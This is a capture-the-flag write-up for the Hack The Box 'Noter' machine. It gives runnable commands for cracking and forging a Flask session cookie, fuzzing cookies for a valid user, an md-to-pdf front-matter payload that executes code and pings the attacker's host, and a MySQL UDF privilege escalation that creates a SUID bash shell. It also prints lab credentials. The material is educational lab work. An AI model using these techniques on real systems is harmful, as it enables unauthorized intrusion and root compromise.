## HTB Noter (Medium) - Writeup

Difficulty: Medium

In this box, I started by enumerating an FTP service and a Flask-based web app where I discovered a weakly signed session cookie.  
Using flask-unsign, I brute-forced the secret key and generated admin session tokens, revealing credentials through a privileged note.  
With those, I accessed the FTP server and downloaded application backups, one of which exposed an RCE vulnerability in a Node.js script (md-to-pdf).  
Finally, I leveraged a MySQL UDF exploit using a discovered root password to escalate to root and gain full control of the system.  
---

## Nmap 

#### The nmap scan revealed three open and ports:  

![obraz](https://github.com/user-attachments/assets/79d8e1d8-1044-487c-ad85-98cbea2b866c)

## Port 21 - FTP

I always start with ftp when doing ctf challenges.  

![obraz](https://github.com/user-attachments/assets/163c9a88-f1a1-466c-a34b-0c13e7b5ea4f)

I tried logging in with username "anonymous" and a blank password "", but it failed.  



## Port 5000 - Website  

Website looks like this and welcomes us with login page:  

![obraz](https://github.com/user-attachments/assets/086102ac-3ec6-4ba1-8e5c-ad7a75b357ef)

First I tried some default credentials like admin:admin, but they failed.  
Then I tried sqli authentication bypass, also failed.  

Let's just register an account:  

![obraz](https://github.com/user-attachments/assets/f346d0f3-aaea-46d8-8c91-3fa1c68e1d83)

We found that this website is running CKEditor for notes:  

![obraz](https://github.com/user-attachments/assets/130aaae1-d657-429d-a7ba-ca8dad7fe8e9)

Then I did directory busting:  
```
feroxbuster --url http://10.10.11.160:5000/ -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
Nothing intresting.  

When we click on note we get /note/3, another idea was to look for IDOR vulnerability.  
I tried /note/1 and a few other ones but they also didn't work.  

Next thing that I checked was response headers with curl:  

![obraz](https://github.com/user-attachments/assets/5c6c3fa8-df43-4696-a292-918c14e1b3df)

That is an intresting finding.  
At first glance it looks like JWT token, unfortunately we wasn't able to decode it.  

Turns out that it is a Flask cookie.  
There is a tool called flask-unsign that can be used to decode flask cookies.  
```
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZWVlZSJ9.aF_apQ.zdGYMEDn5AaY6SsoJSeW4KFz2lc'
```

![obraz](https://github.com/user-attachments/assets/5b755eb3-7512-4d49-845d-f788b87b5617)

Flask cookies contain a secret that can be brute-forced if it's weak enough:  
```
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZWVlZSJ9.aF_apQ.zdGYMEDn5AaY6SsoJSeW4KFz2lc' -w /usr/share/wordlists/rockyou.txt --no-literal-eval
```
![obraz](https://github.com/user-attachments/assets/6a4dc8e5-c3dd-4578-8520-6c5ea1cc4d7d)


## Crafting a cookie  

With the secret we can craft any cookie we want, let's hope there is an admin account:  
```
{% raw %} flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123' {% endraw %}
```
Now I'll replace the cookie with newly created one in devtools.  
Unfortunately it didn't work.  

There is other option that we can try.  
If we create a list of many cookies everyone with different username.  
We then should be able to brute-force website and get different response when we submit existing cookie.  

I created simple script that will generate a list of cookies for us:  
```python
import subprocess

wordlist_path = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'
secret_key = 'secret123'

with open(wordlist_path, 'r') as file:
    for user in file:
        user = user.strip() {% raw %}
        cookie_data = f"{{'logged_in': True, 'username': '{user}'}}" {% endraw %}
        cmd = [
            'flask-unsign',
            '--sign',
            '--cookie', cookie_data,
            '--secret', secret_key
        ]
        subprocess.run(cmd)
```

Now we can run it with:  
```
python3 generate.py > list2.txt
```
It can take up to 5-10 mins.  
Now we want to fuzz an existing cookie:  
```
wfuzz -w list2.txt -u http://10.10.11.160:5000/dashboard -H "Cookie: session=FUZZ" --hc 302
```

![obraz](https://github.com/user-attachments/assets/042091fc-54f9-4650-b55e-436de8dc7461)


It worked, in the syntax we filtered out 302 code and waited for 200.  
Let's open devtools and replace cookie with the one that wfuzz found.  
After we refresh the page we get admin access as user "blue":  

![obraz](https://github.com/user-attachments/assets/49290dd6-5302-41b5-9943-819c4c3b50b3)

I looked through the dashboard and found note with credentials:  

![obraz](https://github.com/user-attachments/assets/fb7ac166-d7a5-4904-ab93-3c20a915a71e)

Let's write them down:  
+  blue:blue@Noter!


## Back to FTP

Those credentials fail for ssh but work for ftp.  

![obraz](https://github.com/user-attachments/assets/7ebc363b-5311-467f-952a-5eff1120cc61)

We transfered policy.pdf to kali, let's take a look at it.  

![obraz](https://github.com/user-attachments/assets/a78798ea-6d86-4c0d-bd73-48ed06757678)

It talked about password policy, the line that was a hint was:  
```
Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)
```

If we look at the previous note, it's signed as ftp_admin.  
We can try to follow the password policy to login as ftp_admin:  
+  Username:  ftp_admin
+  Password:  ftp_admin@Noter!

![obraz](https://github.com/user-attachments/assets/4357e0a9-7896-41c6-8462-3f8240c1f89e)

It worked, we ftp_admin had some application backups, we transfered them to kali.  



## Source Code Analysis  

There are two application backups, I'll unzip this first as it contains more data:  
```
unzip app_backup_1638395546.zip
```
After quick enumeration we found md-to-pdf.js  

![obraz](https://github.com/user-attachments/assets/971e695c-f75a-46fb-a316-ea331856681b)

We also checked it's version.  
There is an exploit for it:  
```
https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
```

It's simple to exploit but first we have to find where our application uses md-to-pdf:  
```python
# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)  {% raw %}
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}" {% endraw %}
                    subprocess.run(command, shell=True, executable="/bin/bash")

                        if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):  {% endraw %}

                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)

                    else:
                        return render_template('export_note.html', error="Error occured while exporting the !")

                except Exception as e:
                        return render_template('export_note.html', error="Error occured!")


            else: {% raw %}
                        return render_template('export_note.html', error=f"Error occured while exporting ! ({error})") 
            
        except Exception as e:
                        return render_template('export_note.html', error=f"Error occured while exporting ! ({e})") {% endraw %}

    else:
        abort(403)
```

/export_note_remote uses md-to-pdf, the part that confirms it is:  

```python
r = pyrequest.get(url,allow_redirects=True)
rand_int = random.randint(1,10000) {% raw %}
command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}" {% endraw %}
subprocess.run(command, shell=True, executable="/bin/bash")
```

If we provide malicious .md file to md-to-pdf.js we can execute code, let's create this file:  
```
cat POC.md                      
---js
((require("child_process")).execSync("ping 10.10.14.5"))
---RCE
```

Now we have to host it on the python server:  

![obraz](https://github.com/user-attachments/assets/ef92eb60-92bd-405e-aa0d-09dd8590c3e2)

And now go to the website and use remote note functionality and specify our server:  

![obraz](https://github.com/user-attachments/assets/a35b0fc4-dbec-4ed7-9359-bf53903473cf)

It successfully reaches our server:  

![obraz](https://github.com/user-attachments/assets/e88b4150-f81e-4873-bc76-48f0d3a19b82)

Then we take a look at tcpdump and we get ping back to our machine meaning we achieved code execution:  

![obraz](https://github.com/user-attachments/assets/24ad6da1-2f1a-40e7-adc3-d8b8f5b4d48e)


## Using RCE to get a shell

We'll start with base64 encoding the payload:  

![obraz](https://github.com/user-attachments/assets/8227f67e-c88e-4e20-92af-2f32fe969f03)

Now put it into a file with .md extension:  

![obraz](https://github.com/user-attachments/assets/22a0f69f-4fee-4b80-af0d-44edc943f0c7)

And do the same thing as we did with POC payload:  

![obraz](https://github.com/user-attachments/assets/6f1598b8-84de-4722-b815-ae629ea7f607)

Lastly retrieve a flag:  

![obraz](https://github.com/user-attachments/assets/e1bf3e38-c30d-4e97-b84f-c8891c0751a8)



## Priv Esc to root

If we run ps aux it only shows processes owned by svc.  

![obraz](https://github.com/user-attachments/assets/ee14891a-b5ea-4ab8-a1d1-a642506d6e15)

It happens because /etc/fstab has hidepid=2, so ps will not show processes of other users.    

We can check services:  
```
cd /etc/systemd
find . -name '*.service'
```
Let's check mysql service:  
```
cat ./system/mysql-start.service
```

I'll paste it here:  
```
[Unit]
Description=MySQL service

[Service]
ExecStart=/usr/sbin/mysqld
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

We now know that mysql runs as user root instead of user mysql.  
It's a dangerous configuration.  

After quick search for exploit I found:  
```
https://www.exploit-db.com/exploits/1518
```

We need to compile it:  
```
gcc -g -c raptor.c
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
![obraz](https://github.com/user-attachments/assets/529c734e-f519-4426-b178-caa17de39e02)

I was stuck here for a while and then noticed that we had second application backup.  
I checked it and found mysql root password:  
+  root:Nildogg36

![obraz](https://github.com/user-attachments/assets/1184bbcd-109e-450e-9864-324d3924f780)

I followed this article to exploit this vulnerability:  
```
https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
```

After logging into mysql we need to run:  
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/svc/raptor_udf2.so'));
```

Now locate plugins directory:  
```
show variables like '%plugin%';
```

Then we run:  
```
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
```

Now we should be able to run commands, we will copy /bin/bash to /tmp and add SUID bit:  
```
select do_system('cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash');
```

The whole exploitation can be seen on screenshot below:  

![obraz](https://github.com/user-attachments/assets/d66473d6-be88-43f6-9bbb-c4bccfb8415f)

![obraz](https://github.com/user-attachments/assets/23eb65c9-7899-46a1-b4c4-2fb04f334fdd)

Now we can use our copy of /bin/bash and escalate to root:  

![obraz](https://github.com/user-attachments/assets/2ec39234-5dcd-4b6d-b7e7-ed7019b47b90)

Thanks for reading!  














































